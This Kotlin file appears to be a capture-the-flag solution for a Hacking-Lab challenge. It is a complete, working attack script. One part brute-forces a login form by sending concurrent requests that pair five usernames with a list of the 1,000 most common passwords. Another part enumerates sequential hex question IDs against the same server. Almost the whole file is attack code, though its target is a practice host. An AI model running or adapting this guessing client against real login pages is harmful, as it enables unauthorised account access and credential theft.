package cz.vernjan.he19.ch10


import cz.vernjan.he19.readFile
import java.math.BigInteger
import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpRequest.BodyPublishers
import java.net.http.HttpResponse.BodyHandlers
import java.time.Duration
import java.util.concurrent.CompletableFuture
import java.util.concurrent.Executors

fun main() {

    guessLogins()

//    guessQuestions()
}

private fun guessLogins() {
    val usernames = listOf("no_one", "the_admin", "null", "the_bean", "hax0r")
    val passwords = readFile("ch10/10-million-password-list-top-1000.txt").split("\n")

    val futures = mutableListOf<CompletableFuture<Void>>()

    PasswordCrackerClient().use { client ->
        for (username in usernames)
            for (password in passwords) {
                futures.add(client.guessLogin(username, password))
            }

        CompletableFuture.allOf(*futures.toTypedArray()).join()
    }
}

private fun guessQuestions() {
    PasswordCrackerClient().use { client ->
        val futures = (0..256)
                .map { BigInteger("5cc9619fb135c70015b79700", 16).add(BigInteger.valueOf(it.toLong())) }
                .map { client.guessQuestion(it.toString(16)) }
                .toTypedArray()

        CompletableFuture.allOf(*futures).join()
    }
}

class PasswordCrackerClient : AutoCloseable {

    private val executorForHttpClient = Executors.newFixedThreadPool(10)

    private val httpClient = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .executor(executorForHttpClient)
            .build()

    fun guessLogin(username: String, password: String): CompletableFuture<Void> {
        val request = HttpRequest.newBuilder()
                .POST(BodyPublishers.ofString("username=$username@stackunderflow.com&password=$password"))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .uri(URI.create("http://whale.hacking-lab.com:3371/login"))
                .timeout(Duration.ofSeconds(10))
                .build()

//        println("Sending $username / $password")
        Thread.sleep(100)

        return httpClient.sendAsync(request, BodyHandlers.ofString())
                .thenAccept { response ->
                    if (!response.body().contains("Unknown user")) {
                        println("Heey! $username / $password")
                    } else {
                        println("No luck for  $username / $password")
                    }
                }
                .exceptionally { print("Exc $it"); guessLogin(username, password); null }
    }

    fun guessQuestion(questionId: String): CompletableFuture<Void> {
        val request = HttpRequest.newBuilder()
                .GET()
                .uri(URI.create("http://whale.hacking-lab.com:3371/questions/$questionId"))
                .timeout(Duration.ofSeconds(10))
                .build()

//        println("Sending $request")
        Thread.sleep(100)

        return httpClient.sendAsync(request, BodyHandlers.ofString())
                .thenAccept { response ->
                    if (!response.body().contains("Unknown question!")) {
                        println("Heey! $questionId")
                    } else {
                        println("No luck for  $questionId")
                    }
                }
                .exceptionally { println(it); null }
    }


    override fun close() {
        executorForHttpClient.shutdown()
    }
}